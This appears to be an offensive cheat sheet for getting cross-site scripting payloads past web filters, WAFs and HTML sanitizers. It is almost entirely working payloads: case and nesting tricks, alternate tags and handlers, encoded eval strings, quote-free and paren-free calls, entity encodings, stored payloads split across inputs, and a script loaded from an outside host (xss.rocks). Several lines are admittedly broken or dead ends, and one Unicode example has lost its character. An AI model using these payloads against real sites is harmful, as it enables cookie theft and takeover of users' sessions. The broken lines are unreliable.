# Filter & WAF bypass — every countermeasure and its counter-countermeasure

Filters fail in three ways: they block a STRING (variant works), they
block a TAG (another tag works), or they parse HTML WRONG (mutation
works). Identify which kind you're facing before writing payloads —
`tools/web/sanitizer_fuzz.py` sweeps the variants systematically.

The flow:

```text
1. inject the benign probe: <b>XSS_PROBE_x</b> — does it survive?
2. inject the structural probe: <img src=x onerror=XSS_PROBE_x>
3. compare what came back — which piece got eaten?
4. the eaten piece names the filter; this file names the bypass
```

---

## 1. String blacklist — the naive filter

The filter strips/ blocks literal strings: `script`, `alert`, `onerror`.

### Case variation — the classic first try

```html
<ScRiPt>alert(1)</ScRiPt>
<SCRIPT>alert(1)</SCRIPT>
<IMG SRC=x ONERROR=alert(1)>
```

HTML tags are case-insensitive; the filter doing `string.replace('script')`
on lowercase misses `SCRIPT`. A filter that normalizes case misses
nested variants:

```html
<scr<script>ipt>alert(1)</scr</script>ipt>
   -- removes 'script' → <script>alert(1)</script> survives
<scr<script>ipt>alert(1)</script>
   -- removes first 'script' → <script>alert(1)</script> survives
<scri<!--x-->pt>alert(1)</scri<!--x-->pt>
   -- comment inside the name — strip comments after tag-parse → <script>
```

### Keyword splitting — comment/CDATA/hex inside the name

```html
<scr%00ipt>alert(1)</scr%00ipt>       -- null byte (old filters)
<scr\x00ipt>alert(1)</scr\x00ipt>       -- url-encoded null
<script x>alert(1)</script x>          -- attr inside close tag
<sCRiPt sRc=//xss.rocks/.j>            -- src-based (external)
<IMG """><SCRIPT>alert(1)</SCRIPT>">   -- quote confusion
```

### Encoding the blocked string

```javascript
// 'alert' blocked → String.fromCharCode equivalent:
eval(String.fromCharCode(97,108,101,114,116,40,49,41))   // alert(1)
eval(atob('YWxlcnQoMSk='))                                 // alert(1)
top[/al/.source+/ert/.source](1)                          // regex source
window['al'+'ert'](1)                                       // concat
eval('\x61\x6c\x65\x72\x74\x28\x31\x29')                    // hex
eval('\141\154\145\162\164\050\061\051')                    // octal
Function('alert(1)')()                                       // constructor
setTimeout('alert(1)')                                       // string timer
```

```html
<!-- 'onerror' blocked → other handlers: -->
<body onload=alert(1)>
<svg onload=alert(1)>
<input onfocus=alert(1) autofocus>
<marquee onstart=alert(1)>
<details open ontoggle=alert(1)>
<video><source onerror=alert(1)>
<!-- ALL handler names — events.md has the full list -->
```

### Multi-stage nesting — write the string twice

```javascript
eval('al'+'ert'+'(1)')                   // split across concat
eval(['al','ert'].join('')+'(1)')         // array join
eval('ale'+'rt(1)')                        // simplest split
window['ev'+'al']('al'+'ert'+'(1)')        // eval itself split
```

---

## 2. Tag blacklist — `script`/`img`/`svg` blocked

The filter kills specific TAG NAMES — swap to any of ~30 others:

```html
<!-- <script> blocked → every other code-exec tag: -->
<body onload=alert(1)>
<svg onload=alert(1)>
<iframe onload=alert(1)>
<img src=x onerror=alert(1)>
<video><source onerror=alert(1)>
<audio src=x onerror=alert(1)>
<input onfocus=alert(1) autofocus>
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
<select autofocus onfocus=alert(1)>
<textarea autofocus onfocus=alert(1)>
<keygen autofocus onfocus=alert(1)>     -- legacy
<object data=javascript:alert(1)>       -- data-URI object
<embed src=javascript:alert(1)>         -- embed
<isindex action=javascript:alert(1) type=submit>  -- legacy
<form><button formaction=javascript:alert(1)>X</button></form>
<meta http-equiv=refresh content="0;javascript:alert(1)">
<link rel=stylesheet href=data:,*{x:expression(alert(1))}>  -- IE expr
<base href=javascript:alert(1)//>
```

```html
<!-- <img> AND <svg> blocked → handler-bearing alternatives: -->
<body onload=alert(1)>
<div onmouseover=alert(1)>x</div>              -- needs hover
<span onmouseover=alert(1)>x</span>
<a onmouseover=alert(1)>x</a>
<xss onmouseover=alert(1)>x</xss>               -- custom tag!
<foo onmouseover=alert(1)>x</foo>
```

Custom/unknown tags carry handlers — the filter checking a whitelist
of known tags misses `<xss onmouseover=...>`.

```html
<!-- BOTH script and on* blocked → non-handler vectors: -->
<iframe src=javascript:alert(1)>         -- src-scheme
<embed src=javascript:alert(1)>
<object data=javascript:alert(1)>
<math><a href=javascript:alert(1)>x</a></math>
<meta http-equiv=refresh content="0;url=javascript:alert(1)">
<base href=javascript:alert(1)//>
<table background=javascript:alert(1)>   -- legacy
<isindex action=javascript:alert(1) type=submit>
<form action=javascript:alert(1)><input type=submit></form>
<button formaction=javascript:alert(1)>x</button>
```

---

## 3. Quote-filtering — quotes eaten or escaped

`'`/`"` get stripped or converted to `\'`/`\"` — write JS without
them:

```javascript
// no quotes needed:
alert(1)                          -- no strings at all
alert(document.domain)            -- property, not literal
alert(document.cookie)            -- property
alert(location.hash.slice(1))     -- read payload from URL hash
alert(name)                       -- window.name (opener-controlled)
eval(String.fromCharCode(97,108,101,114,116,40,49,41))
eval(atob('...') )                -- atob needs a literal — use
                                  String.fromCharCode instead
alert(/xss/.source)                -- regex literal as string
```

```html
<!-- attribute context where quotes die — use backtick/unquoted: -->
<img src=x onerror=alert(1)>           -- no quotes anywhere
<img src=`x` onerror=alert(1)>          -- backtick works as quote
<img src=x onerror="alert(1)">          -- only ONE quote type needed
<img src=x onerror=alert`1`>            -- template literal call
<img src=x onerror=alert(String.fromCharCode(88,83,83))>
```

`javascript:` payloads — if quotes die inside the URL context:

```html
<a href="javascript:alert(1)">x</a>          -- needs the colon only
<a href="javascript:alert(document.domain)">x</a>
<a href=j&Tab;avascript:alert(1)>x</a>        -- tab inside scheme name
```

---

## 4. Parenthesis/`()`-filtering — parens eaten

`(` and `)` get filtered — call functions without them:

```javascript
onerror=alert`1`                      -- tagged template = alert('1')
onerror=alert`xss`                    -- template literal call
onerror=eval(atob`YWxlcnQoMSk=`)       -- atob with template
onerror=setTimeout`alert(1)`          -- setTimeout template
onerror=Function`alert(1)`()          -- Function constructor —
                                       the trailing () needed for call
onerror=location`javascript:alert(1)` -- not valid — location isn't a fn
onerror=location.hash.slice(1)         -- wait — assignment vs call:
onerror=eval(location.hash.slice(1))   -- eval needs parens... use:
onerror=eval`alert(1)`                 -- eval as tagged template
onerror=window.onerror=alert;throw 1   -- throw-string → onerror=alert
onerror=x=>{throw 1};throw 1           -- throws — needs custom handler
onerror=alert;throw`1`                 -- alert via onerror=alert
```

`throw`-based — `onerror=alert;throw 1` works because the assignment
binds alert as the error handler then throw triggers it.

The backtick family is the standard answer: `alert`+template-literal
is `alert('...')` with no parens needed:

```javascript
alert`1`            -- the call
eval`alert(1)`       -- eval via template — the parens inside the string
setTimeout`alert(1)` -- same
Function`alert(1)`   -- returns a function; need `()` to call
```

---

## 5. Space-filtering — whitespace eaten

Spaces inside tags can be replaced by other separators:

```html
<img/src=x/onerror=alert(1)>       -- slashes as separators
<img\tsrc=x\tonerror=alert(1)>     -- tabs
<img\nsrc=x\nonerror=alert(1)>     -- newlines
<img\fsrc=x\fonerror=alert(1)>     -- formfeeds
<img/src="x"/onerror="alert(1)">   -- mixed
<img%20src=x%20onerror=alert(1)>   -- encoded (rarely needed)
<svg/onload=alert(1)>               -- the compact form
```

Inside JS, spaces are rare anyway — `alert(1)` needs none.

---

## 6. HTML-entity filters — `&`/`'`/`"`/`<`/`>` handling

The filter encodes `<` `>` to `&lt;` `&gt;` — the payload lands as
TEXT. The bypass paths:

```text
a) the input lands inside an attribute that takes the value raw
   → the entity-encoding doesn't apply to attribute values
b) the input lands inside <script> — JS context needs different
   encoding (js-context.md)
c) the encoding is decode-then-encode: %3C → < &lt; → two-pass
   mismatch → second decode leaves the raw <
d) the filter encodes SOME entities but forgets a variant
```

```html
<!-- < > filtered → entities that decode back: -->
&lt;img src=x onerror=alert(1)&gt;        -- the filter output
&#60;img src=x onerror=alert(1)&#62;      -- decimal entities
&#x3C;img src=x onerror=alert(1)&#x3E;    -- hex entities
&#x3c;img src=x onerror=alert(1)&#x3e;
&#060;img src=x onerror=alert(1)&#062;    -- padded
&#x000003C;img src=x onerror=alert(1)&#x000003E;  -- long-pad
```

If the parser decodes entities BEFORE the filter check — the
entities pass the filter then decode to real tags.

---

## 7. The `XSS_PROBE_` diagnostic — which piece survived

Inject a layered probe that shows what got eaten:

```html
<img src="XSS_PROBE_src" onerror="XSS_PROBE_handler">
<div title="XSS_PROBE_attr">XSS_PROBE_text</div>
XSS_PROBE_bare
<script>XSS_PROBE_script</script>
<svg onload="XSS_PROBE_svgload">XSS_PROBE_svgtag</svg>
```

Read the response:

```text
all markers present                     → no filter — fire the real payload
XSS_PROBE_handler gone                  → onerror filtered → other handler
XSS_PROBE_src gone                      → attribute filtered → other attr
<img ... gone, XSS_PROBE_text present   → tag filtered → other tag
everything in <script> gone             → script context is text
XSS_PROBE_attr entity-encoded           → attribute values encoded
XSS_PROBE_script gone                   → script filtered → svg/img/etc
```

`sanitizer_fuzz.py` automates this — `--forbidden` names the blocked
pattern and it sweeps 40 variants; each variant's survival is evidence.

---

## 8. The "allowed-tags" filters — sanitizers

A real sanitizer (DOMPurify, HTML Purifier, sanitizer.js) allows a
tag whitelist and strips everything else. The bypasses are
version-specific CVEs — `gadgets.md` has the known-sanitizer escapes.
The structural one:

```html
<!-- sanitizer allows <a><b><i> but no attrs → limited to tag presence -->
<a href=javascript:alert(1)>x</a>       -- if <a>+href both allowed
<a href="javascript:alert(1)">x</a>
<a href=`javascript:alert(1)`>x</a>
<a href=javas&#99;ript:alert(1)>x</a>   -- entity inside scheme
```

DOMPurify historical bypasses — the mutation vectors in
`mutation-xss.md` are the practical ones (forms inside SVG/MathML
namespaces, attribute confusion, namespace confusion).

---

## 9. Server-side filters — the framework-escape set

```text
PHP htmlspecialchars() default: escapes " ' < > & — NOT / or `
PHP strip_tags(): removes ALL tags — a full whitelist
Java JSoup: whitelist-based — check the allowed set
Python bleach: whitelist + attr whitelist
ASP.NET RequestValidation: blocks <, script — bypass via
  %u003c unicode escapes or server-specific
```

The escape-then-unescape bug: the app escapes `<` to `&lt;` then a
LATER function unescapes it → the encoded form passes the check and
decodes at render.

---

## 10. Unicode confusables — lookalike chars

```javascript
// 'a' filtered → fullwidth lookalike:
ａlert(1)          -- U+FF41 fullwidth a — some filters miss it
αlert(1)           -- U+03B1 greek alpha — rarely works but try
lert(1)           -- U+0430 cyrillic a
```

```html
<!-- < > filtered → unicode lookalikes that still parse: -->
‹img src=x onerror=alert(1)›         -- U+2039/203A — no (text)
＜img src=x onerror=alert(1)＞        -- U+FF1C/FF1E fullwidth — no
       -- neither renders as a tag — real bypass is encoding not
          lookalikes; keep this section as "known dead ends"
```

Real Unicode bypasses are normalize-then-check bugs: the filter
normalizes `＜` to `<` AFTER checking for raw `<` — NFKC normalization
in the filter is the target.

---

## 11. The multi-request splits — stored XSS by parts

A length-capped input can't carry the payload — split across inputs:

```javascript
// input 1 (stored in a comment field):
<script>var x='';
// input 2 (another comment):
x+='alert';
// input 3:
x+='(1)';eval(x);</script>
```

Or the URL-split — the payload carried in `#fragment`:

```javascript
// the stored piece is the loader:
<img src=x onerror="eval(location.hash.slice(1))">
// the URL carries the real payload:
#alert(document.domain)
```

The stored piece stays tiny; the URL supplies the code.

---

## 12. The "only inside attribute" filters — context-confined

Filter only checks OUTSIDE attributes (sanitizer style) — inject
INTO an attribute:

```html
<input value="XSS_PROBE_x">   — value attribute raw → break out:
<input value=""><img src=x onerror=alert(1)>">   -- close-quote escape
<input value="javascript:alert(1)">               -- scheme value
<input value="x" onfocus=alert(1) autofocus>      -- add attrs
```

The attribute-context file covers the full breakout set —
`attribute-context.md`.

---

## 13. Bypass checklist — the order to try

```text
1. case variation                        ScRiPt / SCRIPT
2. alternate tag                         svg / body / img / marquee
3. alternate handler                     onload / onfocus / ontoggle
4. nesting                               scr<script>ipt
5. encoding                              hex / entity / unicode
6. quote-free                            backtick / unquoted attr
7. paren-free                            template-literal call
8. space-free                            slash / tab / newline
9. mutation                              namespace / parser diff
10. multi-stage                          split across inputs / URL
11. protocol-relative                    //xss.rocks/.j
12. charset                              UTF-7 / UTF-16 (rare)
```

Each bypass is evidence — `sanitizer_fuzz.py` records which variant
survived as the bypass.
